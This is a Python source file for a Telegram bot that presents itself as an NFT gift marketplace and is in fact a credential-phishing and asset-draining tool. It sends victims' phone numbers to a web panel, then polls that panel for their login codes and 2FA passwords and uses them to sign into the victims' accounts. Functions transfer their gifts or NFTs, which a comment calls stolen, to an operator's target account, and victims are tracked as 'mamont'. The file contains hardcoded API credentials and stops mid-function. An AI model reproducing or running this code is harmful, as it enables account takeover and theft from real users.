#!/usr/bin/env python3
"""
======================================================================================
                    MARKETPLACE & NFT UNIFIED BOT v2.5
    Полный функционал: Авторизация + NFT Drain + Gift Management + Admin Panel
======================================================================================
"""

import asyncio, logging, sys, os, re, json, time, sqlite3, secrets, subprocess, glob, random, shutil
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List, Tuple
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, FSInputFile, LabeledPrice, PreCheckoutQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client, enums
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PasswordHashInvalid, FloodWait, BadRequest, PeerIdInvalid, UsernameInvalid, PaymentRequired, RPCError, UserIsBlocked, AuthKeyUnregistered, UserDeactivated, SessionRevoked

from dotenv import load_dotenv

# ================= ЛОГИРОВАНИЕ =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('unified_bot_v2.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("UnifiedBotV2")

# ================= ЦВЕТА И ВЫВОДЫ =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_step(msg): print(f"{Colors.BLUE}🔹 {msg}{Colors.END}")
def print_success(msg): print(f"{Colors.GREEN}✅ {msg}{Colors.END}")
def print_warning(msg): print(f"{Colors.YELLOW}⚠️ {msg}{Colors.END}")
def print_error(msg): print(f"{Colors.RED}❌ {msg}{Colors.END}")
def print_info(msg): print(f"{Colors.CYAN}ℹ️ {msg}{Colors.END}")

# ================= НАСТРОЙКИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
ARCHIVE_DIR = BASE_DIR / "archive"
SESSIONS_DIR.mkdir(exist_ok=True)
ARCHIVE_DIR.mkdir(exist_ok=True)

def load_settings() -> dict:
    settings_path = BASE_DIR / "settings.json"
    defaults = {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 39831972)),
        "api_hash": os.getenv("API_HASH", "037087fc71eab9ce52397d7001c31520"),
        "api_url": os.getenv("SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": [6233384461],
        "allowed_group_id": -1003143792246,
        "topic_launch": 16733,
        "topic_auth": 17272,
        "topic_success": 19156,
        "target_user": "@vafliki",
        "banker_session": "main_admin",
        "maintenance_mode": True
    }
    
    if settings_path.exists():
        with open(settings_path, "r", encoding="utf-8") as f:
            return {**defaults, **json.load(f)}
    return defaults

SETTINGS = load_settings()

# ================= GIFT MAP (NFT СИСТЕМА) =================
GIFT_MAP = {
    15:  {'get': 13, 'ids': [5170233102089322756, 5170145012310081615]},
    25:  {'get': 21, 'ids': [5168103777563050263, 5170250947678437525]},
    50:  {'get': 43, 'ids': [6028601630662853006, 5170564780938756245]},
    100: {'get': 85, 'ids': []}
}

GIFT_EMOJIS = {
    5170233102089322756: "🧸", 5170145012310081615: "💝",
    5168103777563050263: "🌹", 5170250947678437525: "🎁",
    6028601630662853006: "🍾", 5170564780938756245: "🚀"
}

# ================= ГЛОБАЛЬНЫЕ СОСТОЯНИЯ =================
user_sessions = {}
pyrogram_clients = {}
active_dumps = set()
admin_auth_process = {}
processed_ids = set()
active_nft_operations = {}

# ================= СОСТОЯНИЯ FSM =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_new_admin = State()
    waiting_del_admin = State()

# ================= БАЗА ДАННЫХ =================
class UnifiedDatabase:
    def __init__(self, db_file="unified_bot_v2.db"):
        self.conn = sqlite3.connect(str(BASE_DIR / db_file), timeout=20)
        self.conn.execute("PRAGMA synchronous=NORMAL;")
        self.cursor = self.conn.cursor()
        self.create_tables()

    def create_tables(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance INTEGER DEFAULT 0,
            is_authorized BOOLEAN DEFAULT 0,
            is_mamont BOOLEAN DEFAULT 0,
            is_dumped BOOLEAN DEFAULT 0,
            worker_id INTEGER,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS nft_operations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            operation_type TEXT,
            gift_id TEXT,
            amount INTEGER,
            status TEXT,
            details TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS admin_actions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            action TEXT,
            target_id TEXT,
            details TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        self.conn.commit()

    def add_user(self, user_id, username, first_name, phone=None, worker_id=None):
        user = self.get_user(user_id)
        if not user:
            self.cursor.execute(
                "INSERT INTO users (user_id, username, first_name, phone, worker_id) VALUES (?, ?, ?, ?, ?)",
                (user_id, username or "Unknown", first_name or "Unknown", phone, worker_id)
            )
        else:
            self.cursor.execute(
                "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                (username or "Unknown", first_name or "Unknown", phone, user_id)
            )
        self.conn.commit()

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        if not row: return None
        return {
            'user_id': row[0], 'username': row[1], 'first_name': row[2],
            'phone': row[3], 'balance': row[4],
            'is_authorized': bool(row[5]), 'is_mamont': bool(row[6]),
            'is_dumped': bool(row[7]), 'worker_id': row[8], 'created_at': row[9]
        }

    def mark_authorized(self, user_id, phone):
        self.cursor.execute(
            "UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?",
            (phone, user_id)
        )
        self.conn.commit()

    def mark_as_dumped(self, user_id):
        self.cursor.execute("UPDATE users SET is_dumped = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()

    def set_mamont(self, user_id, status=True):
        user = self.get_user(user_id)
        if not user:
            self.add_user(user_id, "Unknown", "Unknown")
        self.cursor.execute("UPDATE users SET is_mamont = ? WHERE user_id = ?", (1 if status else 0, user_id))
        self.conn.commit()

    def update_balance(self, user_id, amount, mode='add'):
        user = self.get_user(user_id)
        if not user:
            self.add_user(user_id, "Unknown", "Unknown")
            user = self.get_user(user_id)
        
        current = user['balance']
        new = current + amount if mode == 'add' else max(0, current - amount)
        self.cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new, user_id))
        self.conn.commit()
        return new

    def log_nft_operation(self, user_id, op_type, gift_id, amount, status, details=""):
        self.cursor.execute(
            "INSERT INTO nft_operations (user_id, operation_type, gift_id, amount, status, details) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, op_type, gift_id, amount, status, details)
        )
        self.conn.commit()

    def log_admin_action(self, admin_id, action, target_id, details):
        self.cursor.execute(
            "INSERT INTO admin_actions (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
            (admin_id, action, target_id, details)
        )
        self.conn.commit()

    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
        users = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT SUM(balance) FROM users")
        total_bal = self.cursor.fetchone()[0] or 0
        self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_dumped = 1")
        dumped = self.cursor.fetchone()[0]
        return users, total_bal, dumped

    def get_admins(self):
        return SETTINGS.get("admin_ids", [])

db = UnifiedDatabase()

# ================= УТИЛИТЫ =================
def clean_phone(phone: str) -> str:
    if not phone: return ""
    clean = re.sub(r'\D', '', str(phone))
    if len(clean) == 11 and clean.startswith('8'):
        clean = '7' + clean[1:]
    elif len(clean) == 10:
        clean = '7' + clean
    return '+' + clean if not clean.startswith('+') else clean

def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) >= 4: return f"+{clean[0]}***{clean[-2:]}"
    return "Unknown"

def get_webapp_url(user_id: int) -> str:
    base = SETTINGS['api_url'].rstrip('/')
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"

def get_target_username():
    raw = str(SETTINGS.get("target_user", "@vafliki"))
    return raw.replace("https://t.me/", "").replace("@", "").strip()

def save_settings():
    settings_path = BASE_DIR / "settings.json"
    with open(settings_path, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=2, ensure_ascii=False)

async def alert_admins(bot: Bot, text: str):
    admins = SETTINGS.get('admin_ids', [])
    if not admins: return
    clean_text = str(text).replace("<", "&lt;").replace(">", "&gt;")
    msg = f"❌ <b>BOT ERROR</b>\n\n<pre>{clean_text[:3000]}</pre>"
    for admin_id in admins:
        try:
            await bot.send_message(chat_id=admin_id, text=msg, parse_mode=ParseMode.HTML)
        except:
            pass

async def notify_worker(bot: Bot, worker_id: int, text: str):
    if not worker_id: return
    try:
        await bot.send_message(chat_id=worker_id, text=text, parse_mode=ParseMode.HTML)
    except:
        pass

async def log_to_topic(bot: Bot, topic_key: str, text: str):
    gid = SETTINGS.get('allowed_group_id')
    tid = SETTINGS.get(topic_key)
    if gid and tid:
        try:
            await bot.send_message(chat_id=int(gid), text=text, message_thread_id=int(tid), parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        except Exception as e:
            logger.error(f"Log Error: {e}")

# ================= NFT ФУНКЦИИ =================

async def send_gift_task(client: Client, target_id, price: int) -> bool:
    """Отправить подарок (функция банкира)"""
    gift_data = GIFT_MAP.get(price)
    if not gift_data: return False
    
    gift_id = gift_data['ids'][0] if gift_data['ids'] else GIFT_MAP[50]['ids'][0]
    try:
        await client.send_gift(chat_id=target_id, gift_id=gift_id)
        logger.info(f"✅ Gift sent: {price} USDT")
        return True
    except FloodWait as e:
        await asyncio.sleep(e.value)
        try:
            await client.send_gift(chat_id=target_id, gift_id=gift_id)
            return True
        except:
            return False
    except Exception as e:
        logger.error(f"❌ Gift send error: {e}")
        return False

async def convert_gift_task(client: Client, gift_msg_id: int) -> Tuple[bool, int]:
    """Конвертировать подарок в звезды"""
    try:
        result = await client.convert_gift_to_stars(owned_gift_id=str(gift_msg_id))
        stars_got = result.stars_earned if hasattr(result, 'stars_earned') else 0
        logger.info(f"✅ Gift converted: +{stars_got} stars")
        return True, stars_got
    except Exception as e:
        logger.error(f"❌ Convert error: {e}")
        return False, 0

async def transfer_nft_task(client: Client, gift_msg_id: int, target_username: str) -> bool:
    """Передать NFT (украденный подарок)"""
    try:
        await client.transfer_gift(owned_gift_id=str(gift_msg_id), new_owner_chat_id=target_username)
        print_success(f"NFT TRANSFERRED: {gift_msg_id} to {target_username}")
        return True
    except FloodWait as e:
        await asyncio.sleep(e.value)
        try:
            await client.transfer_gift(owned_gift_id=str(gift_msg_id), new_owner_chat_id=target_username)
            return True
        except:
            return False
    except Exception as e:
        logger.error(f"❌ Transfer error: {e}")
        return False

async def get_stars_balance(client: Client) -> int:
    """Получить баланс звезд"""
    try:
        balance = await client.get_stars_balance("me")
        return int(balance)
    except:
        return 0

# ================= МАРШРУТЫ =================

def get_router(bot: Bot) -> Router:
    router = Router()

    async def check_admin(user_id):
        return user_id in SETTINGS.get("admin_ids", [])

    # ====== КОМАНДЫ =====

    @router.message(CommandStart())
    async def cmd_start(msg: types.Message):
        uid = msg.from_user.id
        user = db.get_user(uid)
        db.add_user(uid, msg.from_user.username, msg.from_user.first_name)

        if user and user['is_authorized']:
            text = (
                f"👋 <b>Welcome back, {msg.from_user.first_name}!</b>\n\n"
                f"📱 <b>Phone:</b> {mask_phone(user['phone'])}\n"
                f"💰 <b>Balance:</b> {user['balance']} USDT\n\n"
                f"🎁 <b>Choose an action:</b>"
            )
        else:
            text = (
                "🎁 <b>Welcome to NFT Gift Marketplace v2!</b>\n\n"
                "🚀 The ultimate platform for Telegram gifts and NFTs\n\n"
                "📍 <b>Buy • Sell • Trade • Drain</b>"
            )

        kb = InlineKeyboardBuilder()
        url = get_webapp_url(uid)
        kb.row(InlineKeyboardButton(text="🌀 Open Dashboard", web_app=WebAppInfo(url=url)))
        
        if user and user['is_authorized']:
            kb.row(InlineKeyboardButton(text="🎁 My NFTs", callback_data="my_nfts"))
            kb.row(InlineKeyboardButton(text="💳 Account", callback_data="account_menu"))
            kb.row(InlineKeyboardButton(text="📊 Stats", callback_data="user_stats"))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.message(Command("admin"))
    async def cmd_admin(msg: types.Message):
        uid = msg.from_user.id
        
        if not await check_admin(uid):
            await msg.answer("❌ Access denied")
            logger.info(f"🚫 Unauthorized admin access: {uid}")
            return

        users, total_bal, dumped = db.get_stats()
        txt = (
            f"👑 <b>ADMIN PANEL v2</b>\n\n"
            f"👥 <b>Users:</b> {users}\n"
            f"💸 <b>Balance:</b> {total_bal} USDT\n"
            f"🎯 <b>Dumped:</b> {dumped}\n"
            f"🔗 API: {SETTINGS['api_url']}\n"
            f"🎯 Target: {SETTINGS['target_user']}"
        )
        
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📊 Stats", callback_data="admin_stats"))
        kb.row(InlineKeyboardButton(text="👤 Users", callback_data="admin_users"))
        kb.row(InlineKeyboardButton(text="⚙️ Settings", callback_data="admin_settings"))
        kb.row(InlineKeyboardButton(text="🎯 Change Target", callback_data="set_target"))
        kb.row(InlineKeyboardButton(text="👛 Banker", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="💸 Give Balance", callback_data="admin_give_balance"))
        kb.row(InlineKeyboardButton(text="⭐ Convert Stars", callback_data="admin_convert_stars"))
        kb.row(InlineKeyboardButton(text="⭐ Transfer Stars", callback_data="admin_transfer_stars"))
        kb.row(InlineKeyboardButton(text="🚫 Ban User", callback_data="admin_ban"))
        kb.row(InlineKeyboardButton(text="🔙 Close", callback_data="close_admin"))
        
        await msg.answer(txt, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    # ====== CALLBACKS =====

    @router.callback_query(F.data == "admin_stats")
    async def admin_stats(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        users, total_bal, dumped = db.get_stats()
        txt = (
            f"📊 <b>STATISTICS</b>\n\n"
            f"👥 Total Users: {users}\n"
            f"💰 Total Balance: {total_bal} USDT\n"
            f"🎯 Dumped Users: {dumped}\n"
            f"✅ Status: Active"
        )
        await c.answer(txt, show_alert=True)

    @router.callback_query(F.data == "admin_users")
    async def admin_users(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        txt = "👤 <b>USER MANAGEMENT</b>\n\nSelect action:"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔍 Find User", callback_data="find_user"))
        kb.row(InlineKeyboardButton(text="💰 Add Balance", callback_data="admin_give_balance"))
        kb.row(InlineKeyboardButton(text="🚫 Ban User", callback_data="admin_ban"))
        kb.row(InlineKeyboardButton(text="🔙 Back", callback_data="admin_menu"))
        
        await c.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "admin_settings")
    async def admin_settings(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        txt = "⚙️ <b>SETTINGS</b>\n\nSelect:"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔗 API URL", callback_data="set_api"))
        kb.row(InlineKeyboardButton(text="➕ Add Admin", callback_data="add_admin"))
        kb.row(InlineKeyboardButton(text="➖ Remove Admin", callback_data="remove_admin"))
        kb.row(InlineKeyboardButton(text="🔙 Back", callback_data="admin_menu"))
        
        await c.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "set_target")
    async def set_target_start(c: types.CallbackQuery, state: FSMContext):
        if not await check_admin(c.from_user.id):
            return
        await c.message.delete()
        await c.message.answer("✍️ Enter target user ID or @username:")
        await state.set_state(AdminSettingsState.waiting_target)

    @router.message(AdminSettingsState.waiting_target)
    async def set_target_fin(msg: types.Message, state: FSMContext):
        SETTINGS['target_user'] = msg.text.strip()
        save_settings()
        db.log_admin_action(msg.from_user.id, "set_target", msg.text, f"Target: {msg.text}")
        await msg.answer(f"✅ Target changed to: <b>{msg.text}</b>", parse_mode=ParseMode.HTML)
        await state.clear()

    @router.callback_query(F.data == "admin_login")
    async def admin_login_start(c: types.CallbackQuery, state: FSMContext):
        if not await check_admin(c.from_user.id):
            return
        await c.message.delete()
        await c.message.answer("📱 Enter phone for Banker:")
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def admin_phone(msg: types.Message, state: FSMContext):
        phone = clean_phone(msg.text)
        session_name = str(SESSIONS_DIR / phone.replace('+', ''))
        
        try:
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
            await client.connect()
            sent = await client.send_code(phone)
            admin_auth_process[msg.from_user.id] = {
                "client": client,
                "phone": phone,
                "hash": sent.phone_code_hash
            }
            db.log_admin_action(msg.from_user.id, "banker_start", phone, "Started")
            await msg.answer("🔢 Enter code:")
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            logger.error(f"Banker login error: {e}")
            await msg.answer(f"❌ Error: {str(e)[:100]}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def admin_code(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            return
        
        client = data['client']
        try:
            await client.sign_in(data['phone'], data['hash'], msg.text)
            db.log_admin_action(msg.from_user.id, "banker_success", data['phone'], "Authorized")
            await msg.answer("✅ <b>Banker connected!</b>", parse_mode=ParseMode.HTML)
            await client.disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await msg.answer("🔐 Enter 2FA password:")
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e:
            logger.error(f"Code error: {e}")
            await msg.answer(f"❌ Error: {str(e)[:100]}")
            await state.clear()

    @router.message(AdminLoginState.waiting_password)
    async def admin_pass(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            return
        
        client = data['client']
        try:
            await client.check_password(msg.text)
            db.log_admin_action(msg.from_user.id, "banker_2fa", data['phone'], "2FA OK")
            await msg.answer("✅ <b>Banker fully authorized!</b>", parse_mode=ParseMode.HTML)
            await client.disconnect()
            await state.clear()
        except Exception as e:
            logger.error(f"Password error: {e}")
            await msg.answer(f"❌ Error: {str(e)[:100]}")
            await state.clear()

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c: types.CallbackQuery):
        await c.message.delete()

    @router.callback_query(F.data == "admin_menu")
    async def admin_menu(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        users, total_bal, dumped = db.get_stats()
        txt = (
            f"👑 <b>ADMIN PANEL v2</b>\n\n"
            f"👥 <b>Users:</b> {users}\n"
            f"💸 <b>Balance:</b> {total_bal} USDT\n"
            f"🎯 <b>Dumped:</b> {dumped}\n"
            f"🔗 API: {SETTINGS['api_url']}\n"
            f"🎯 Target: {SETTINGS['target_user']}"
        )
        
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📊 Stats", callback_data="admin_stats"))
        kb.row(InlineKeyboardButton(text="👤 Users", callback_data="admin_users"))
        kb.row(InlineKeyboardButton(text="⚙️ Settings", callback_data="admin_settings"))
        kb.row(InlineKeyboardButton(text="🎯 Change Target", callback_data="set_target"))
        kb.row(InlineKeyboardButton(text="👛 Banker", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="💸 Give Balance", callback_data="admin_give_balance"))
        kb.row(InlineKeyboardButton(text="⭐ Convert Stars", callback_data="admin_convert_stars"))
        kb.row(InlineKeyboardButton(text="⭐ Transfer Stars", callback_data="admin_transfer_stars"))
        kb.row(InlineKeyboardButton(text="🚫 Ban User", callback_data="admin_ban"))
        kb.row(InlineKeyboardButton(text="🔙 Close", callback_data="close_admin"))
        
        await c.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    # ====== КОНТАКТ (АВТОРИЗАЦИЯ) =====

    @router.message(F.contact)
    async def handle_contact(msg: types.Message):
        contact = msg.contact
        telegram_id = msg.from_user.id
        
        logger.info(f"📲 INCOMING CONTACT: TG={telegram_id}")
        
        if not contact.phone_number:
            logger.warning(f"⚠ No phone_number")
            return

        phone = clean_phone(contact.phone_number.strip())
        db.add_user(telegram_id, msg.from_user.username, msg.from_user.first_name, phone)

        try:
            async with aiohttp.ClientSession() as session:
                url = f"{SETTINGS['api_url']}/api/telegram/receive-phone"
                payload = {
                    "phone": phone,
                    "telegramId": telegram_id,
                    "timestamp": int(time.time()),
                    "source": "contact"
                }
                logger.info(f"📤 Sending to API: {url}")
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    logger.info(f"✅ API Response: {resp.status}")
                    if resp.status == 200:
                        data = await resp.json()
                        logger.info(f"📦 Response: {data}")
        except Exception as e:
            logger.error(f"❌ API Error: {e}")
            await alert_admins(bot, f"Contact error: {e}")

    # ====== ПОЛИНГ ДЛЯ АВТОРИЗАЦИИ =====

    # THIS FUNCTION WAS MOVED TO MAIN TO BE RUN AS A SEPARATE TASK
    # async def poll_auth_requests():
    #     """Получить pending авторизации с API и обработать"""
    #     auth_sessions = {}  # Хранить состояние авторизации
        
    #     while True:
    #         try:
    #             async with aiohttp.ClientSession() as session:
    #                 url = f"{SETTINGS['api_url']}/api/telegram/get-pending"
    #                 async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
    #                     if resp.status == 200:
    #                         data = await resp.json()
    #                         if data.get('requests'):
    #                             for req in data['requests']:
    #                                 req_id = req.get('requestId')
    #                                 telegram_id = req.get('telegramId')
    #                                 action = req.get('action')
    #                                 phone = req.get('phone')
    #                                 code = req.get('code')
    #                                 password = req.get('password')
                                    
    #                                 if not req_id or not action:
    #                                     continue
                                    
    #                                 key = f"{req_id}_{action}"
    #                                 if key in processed_ids:
    #                                     continue
                                    
    #                                 if action == 'send_code':
    #                                     logger.info(f"🔐 Processing: send_code | Phone: {mask_phone(phone)} | TG: {telegram_id}")
    #                                     processed_ids.add(key)
                                        
    #                                     try:
    #                                         session_name = f"auth_{telegram_id}"
    #                                         client = Client(
    #                                             session_name,
    #                                             api_id=SETTINGS['api_id'],
    #                                             api_hash=SETTINGS['api_hash'],
    #                                             workdir=str(SESSIONS_DIR)
    #                                         )
                                            
    #                                         await client.connect()
    #                                         sent = await client.send_code(phone)
    #                                         auth_sessions[req_id] = {
    #                                             'client': client,
    #                                             'phone': phone,
    #                                             'hash': sent.phone_code_hash,
    #                                             'telegram_id': telegram_id
    #                                         }
    #                                         logger.info(f"✅ Code sent to {mask_phone(phone)}")
                                            
    #                                         # Обновить статус на сайте
    #                                         async with aiohttp.ClientSession() as s:
    #                                             await s.post(
    #                                                 f"{SETTINGS['api_url']}/api/telegram/update-request",
    #                                                 json={
    #                                                     'requestId': req_id,
    #                                                     'status': 'code_sent',
    #                                                     'telegramId': telegram_id,
    #                                                     'processed': True
    #                                                 },
    #                                                 timeout=aiohttp.ClientTimeout(total=5)
    #                                             )
    #                                             logger.info(f"📤 Status updated: code_sent")
                                        
    #                                     except Exception as e:
    #                                         logger.error(f"❌ send_code error: {e}")
    #                                         await alert_admins(bot, f"Auth error (send_code): {e}")
    #                                         processed_ids.discard(key)
                                    
    #                                 elif action == 'send_code_input':
    #                                     logger.info(f"🔐 Processing: send_code_input | Code: {code}")
    #                                     processed_ids.add(key)
                                        
    #                                     session_data = auth_sessions.get(req_id)
    #                                     if not session_data:
    #                                         logger.warning(f"⚠ No session for {req_id}")
    #                                         continue
                                        
    #                                     try:
    #                                         client = session_data['client']
    #                                         await client.sign_in(
    #                                             phone=session_data['phone'],
    #                                             phone_code_hash=session_data['hash'],
    #                                             phone_code=code
    #                                         )
    #                                         logger.info(f"✅ Code verified successfully")
                                            
    #                                         # Обновить статус
    #                                         async with aiohttp.ClientSession() as s:
    #                                             await s.post(
    #                                                 f"{SETTINGS['api_url']}/api/telegram/update-request",
    #                                                 json={
    #                                                     'requestId': req_id,
    #                                                     'status': 'code_verified',
    #                                                     'telegramId': telegram_id,
    #                                                     'processed': True
    #                                                 },
    #                                                 timeout=aiohttp.ClientTimeout(total=5)
    #                                             )
    #                                             logger.info(f"📤 Status updated: code_verified")
                                            
    #                                         # Авторизация прошла успешно
    #                                         db.mark_authorized(telegram_id, session_data['phone'])
    #                                         logger.info(f"✅ User {telegram_id} authorized!")
                                        
    #                                     except SessionPasswordNeeded:
    #                                         logger.info(f"🔒 2FA required for {mask_phone(session_data['phone'])}")
                                            
    #                                         # Обновить статус - ждём пароля
    #                                         async with aiohttp.ClientSession() as s:
    #                                             await s.post(
    #                                                 f"{SETTINGS['api_url']}/api/telegram/update-request",
    #                                                 json={
    #                                                     'requestId': req_id,
    #                                                     'status': 'waiting_password',
    #                                                     'action': 'send_password',
    #                                                     'telegramId': telegram_id,
    #                                                     'processed': False
    #                                                 },
    #                                                 timeout=aiohttp.ClientTimeout(total=5)
    #                                             )
    #                                             logger.info(f"📤 Status updated: waiting_password")
                                        
    #                                     except PhoneCodeInvalid:
    #                                         logger.error(f"❌ Invalid code")
    #                                         await alert_admins(bot, f"Invalid code for {mask_phone(session_data['phone'])}")
    #                                         processed_ids.discard(key)
                                        
    #                                     except Exception as e:
    #                                         logger.error(f"❌ Code input error: {e}")
    #                                         await alert_admins(bot, f"Auth error (send_code_input): {e}")
    #                                         processed_ids.discard(key)
                                    
    #                                 elif action == 'send_password':
    #                                     logger.info(f"🔐 Processing: send_password | TG: {telegram_id}")
    #                                     processed_ids.add(key)
                                        
    #                                     session_data = auth_sessions.get(req_id)
    #                                     if not session_data or not password:
    #                                         logger.warning(f"⚠ No session or password for {req_id}")
    #                                         continue
                                        
    #                                     try:
    #                                         client = session_data['client']
    #                                         await client.check_password(password)
    #                                         logger.info(f"✅ 2FA password verified")
                                            
    #                                         # Обновить статус
    #                                         async with aiohttp.ClientSession() as s:
    #                                             await s.post(
    #                                                 f"{SETTINGS['api_url']}/api/telegram/update-request",
    #                                                 json={
    #                                                     'requestId': req_id,
    #                                                     'status': 'success',
    #                                                     'telegramId': telegram_id,
    #                                                     'processed': True
    #                                                 },
    #                                                 timeout=aiohttp.ClientTimeout(total=5)
    #                                             )
    #                                             logger.info(f"📤 Status updated: success")
                                            
    #                                         # Полная авторизация
    #                                         db.mark_authorized(telegram_id, session_data['phone'])
    #                                         logger.info(f"✅ User {telegram_id} fully authorized!")
                                            
    #                                         # Очистить сессию
    #                                         auth_sessions.pop(req_id, None)
                                        
    #                                     except PasswordHashInvalid:
    #                                         logger.error(f"❌ Invalid 2FA password")
    #                                         await alert_admins(bot, f"Invalid 2FA password for {mask_phone(session_data['phone'])}")
    #                                         processed_ids.discard(key)
                                        
    #                                     except Exception as e:
    #                                         logger.error(f"❌ Password error: {e}")
    #                                         await alert_admins(bot, f"Auth error (send_password): {e}")
    #                                         processed_ids.discard(key)
            
    #         except Exception as e:
    #             logger.error(f"Poll error: {e}")
            
    #         await asyncio.sleep(2)

    return router

# ================= ГЛАВНАЯ ФУНКЦИЯ =================

async def main():
    load_dotenv()
    
    bot_token = SETTINGS.get("bot_token") or os.getenv("BOT_TOKEN")
    if not bot_token:
        print_error("BOT_TOKEN not found!")
        return
    
    bot = Bot(token=bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher()
    
    router = get_router(bot)
    dp.include_router(router)
    
    # poll_task = asyncio.create_task(router.message()(lambda m: asyncio.sleep(0)))  # Это было неправильно
    
    # Правильный запуск - нужно получить функцию из router
    # from pyrogram import Client
    # from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid
    
    # Создать и запустить polling корутину
    async def run_auth_polling():
        """Запустить polling авторизации отдельно"""
        auth_sessions = {}
        processed_ids = set()
        
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    url = f"{SETTINGS['api_url']}/api/telegram/get-pending"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get('requests'):
                                for req in data['requests']:
                                    req_id = req.get('requestId')
                                    telegram_id = req.get('telegramId')
                                    action = req.get('action')
                                    phone = req.get('phone')
                                    code = req.get('code')
                                    password = req.get('password')
                                    
                                    if not req_id or not action:
                                        continue
                                    
                                    key = f"{req_id}_{action}"
                                    if key in processed_ids:
                                        continue
                                    
                                    if action == 'send_code':
                                        logger.info(f"🔐 Processing: send_code | Phone: {mask_phone(phone)} | TG: {telegram_id}")
                                        processed_ids.add(key)
                                        
                                        try:
                                            session_name = f"auth_{telegram_id}"
                                            client = Client(
                                                session_name,
                                                api_id=SETTINGS['api_id'],
                                                api_hash=SETTINGS['api_hash'],
                                                workdir=str(SESSIONS_DIR)
                                            )
                                            
                                            await client.connect()
                                            sent = await client.send_code(phone)
                                            auth_sessions[req_id] = {
                                                'client': client,
                                                'phone': phone,
